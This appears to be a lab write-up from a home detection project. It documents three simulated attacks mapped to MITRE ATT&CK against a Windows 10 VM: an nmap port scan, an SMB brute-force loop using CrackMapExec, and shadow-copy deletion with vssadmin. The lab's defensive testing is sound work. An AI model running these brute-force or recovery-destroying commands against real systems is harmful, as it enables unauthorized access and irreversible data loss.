# 02 — Attack Simulation

## Overview

This document details the adversary behaviors simulated against the Windows 10 endpoint (`Win10-Victim`, IP: `192.168.230.129`) from the Kali Linux attacker machine.

All techniques are mapped to the **MITRE ATT&CK** framework.

---

## Attack 1: Reconnaissance — Network Port Scanning

**MITRE ATT&CK:** `T1046` — Network Service Discovery

### Objective
Identify open ports and running services on the target Windows 10 machine.

### Command

```bash
nmap -sV -p- 192.168.230.129
```

**Flags:**
- `-sV` — Detect service versions
- `-p-` — Scan all 65535 ports

### Result

After disabling Windows Firewall on the victim machine, the scan revealed several critical open ports:

| Port | State | Service |
|------|-------|---------|
| 135/tcp | open | Microsoft Windows RPC |
| 139/tcp | open | NetBIOS-SSN |
| **445/tcp** | **open** | **Microsoft SMB (microsoft-ds)** |
| 49664-49688/tcp | open | Dynamic RPC |

**OS Detection:** Windows 10 / Server 2019 Build 19041 x64

![Nmap Scan Result](../images/attacks/nmap_scan.jpg)

---

## Attack 2: Credential Attack — SMB Brute-Force

**MITRE ATT&CK:** `T1110` — Brute Force

### Objective
Enumerate valid credentials against the SMB service (port 445) to gain unauthorized access.

### Tool: CrackMapExec

```bash
# Create a password wordlist
echo -e "password\n123456\nAdmin123\nWelcome1\nP@ssw0rd\n<correct_password>" > ~/passwords.txt

# Run brute-force attack with bash loop (compatible with all CME versions)
while read pass; do crackmapexec smb 192.168.230.129 -u Administrator -p "$pass"; sleep 1; done < ~/passwords.txt
```

### Result

CrackMapExec successfully authenticated with the correct credentials:

```
SMB  192.168.230.129  445  DESKTOP-IJC9C5B  [+] DESKTOP-IJC9C5B\Administrator:*** (Pwn3d!)
```

The `[+]` indicator and `(Pwn3d!)` confirm successful authentication with full administrative access.

![Brute Force Success](../images/attacks/brute_force.jpg)

> ⚠️ **Note:** Passwords are redacted in documentation. Never expose real credentials in public repositories.

---

## Attack 3: Impact — Ransomware Simulation (Shadow Copy Deletion)

**MITRE ATT&CK:** `T1490` — Inhibit System Recovery

### Objective
Simulate ransomware pre-encryption behavior by deleting Windows Volume Shadow Copies — the primary method used by ransomware families such as WannaCry, LockBit, and REvil to prevent file recovery.

### Command (executed on Windows 10 as Administrator)

```powershell
vssadmin.exe delete shadows /all /quiet
```

**Flags:**
- `/all` — Target all shadow copies on all volumes
- `/quiet` — Suppress confirmation prompts (stealth execution)

### Result

```
No items found that satisfy the query.
```

*(No shadow copies existed on this fresh VM, but the command execution was logged and detected by Wazuh.)*

![Ransomware Simulation](../images/attacks/ransomware_sim.jpg)
